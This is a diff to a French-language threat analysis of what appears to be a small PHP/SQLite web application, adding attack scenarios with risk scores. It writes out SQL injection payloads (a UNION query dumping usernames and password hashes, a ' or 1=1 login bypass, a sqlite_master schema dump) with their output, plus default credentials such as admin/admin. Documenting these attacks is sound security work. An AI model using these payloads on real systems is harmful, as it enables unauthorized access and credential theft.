@@ -121,7 +121,35 @@ Obtenir les mots de passe en clair pour pouvoir devenir administrateur du site e
 
 Un attaquant trouve un accès privilégié aux hash des mots de passe par n'importe quel moyen. Dans cette attaque, nous considérerons une attaque SQL. Une fois la liste des hash de mots de passe obtenu en offline, il est possible de trouver des collisions dans le système de hash MD5.
 
+```sql
+'UNION select username, password from userSti;#
+```
+
+Le resultat est peu lisible puisque le premier paramètre est inscrit dans l'URL du lien et le mot de passe est affiché. Toutefois, cela permet de récupérer l'information pour pouvoir casser le hash en offline
+
+```html
+ <p> <a href="writeMessage.php?id=admin"> envoyer un message</a>: 21232f297a57a5a743894a0e4a801fc3</p>
+```
+
+
+
 Score de risque : Probabilité **Medium** et un risque **Medium**
+
+
+
+----
+
+### Éléments du système attaqué : Credentials par défaut
+
+L'élément attaqué ici est la faiblesse des choix des mots de passes
+
+#### Motivation
+
+Obtenir un accès à des comptes administrateurs
+
+#### Scénario d'attaque
+
+Un attaquant cherche des credentials qu'un utilisateur n'ayant pas pris le temps de modifier. `admin/admin | admin/passsword`...
 
 ---
 
@@ -136,6 +164,41 @@ Obtenir un accès privilégié sans droits d'accès administrateur.
 #### Scénario d'attaque
 
 Un attaquant utilise une injection sql permettant d'outrepassé le système de login.
+
+```SQL
+' or 1=1;#
+```
+
+---
+
+### Éléments du système attaqué : Découverte de l'architecture de la base de données
+
+L'élément attaqué ici est une table particulière dans la base de données
+
+
+
+#### Motivation 
+
+Connaitre les tables de la base de données pour pouvoir y recupérer les informations voulues
+
+#### Scénario d'attaque
+
+Un attaquant utilise une injection sql Union sur la page ` contact.php`   pour lister les scripts de générations des tables de la base de données
+
+```sql
+'UNION select name,sql from sqlite_master;
+
+```
+
+Le résultat retourné est 
+
+```sql
+CREATE TABLE 'message' ('id' integer PRIMARY KEY AUTOINCREMENT, receiptDate DATE NOT NULL, sender integer NULL, receiver integer NULL, sujet varchar (50) NOT NULL, messageBody varchar (500) NOT NULL, CONSTRAINT fk_sender FOREIGN KEY(sender) REFERENCES userSti(id), CONSTRAINT fk_receiver FOREIGN KEY(receiver) REFERENCES userSti(id) )
+
+CREATE TABLE 'userSti' ('id' integer PRIMARY KEY AUTOINCREMENT, username varchar (50) UNIQUE NOT NULL, password varchar (255) NOT NULL, isAdmin INT(1) NOT NULL, isActive INT(1) NOT NULL )
+```
+
+
 
 ---
 
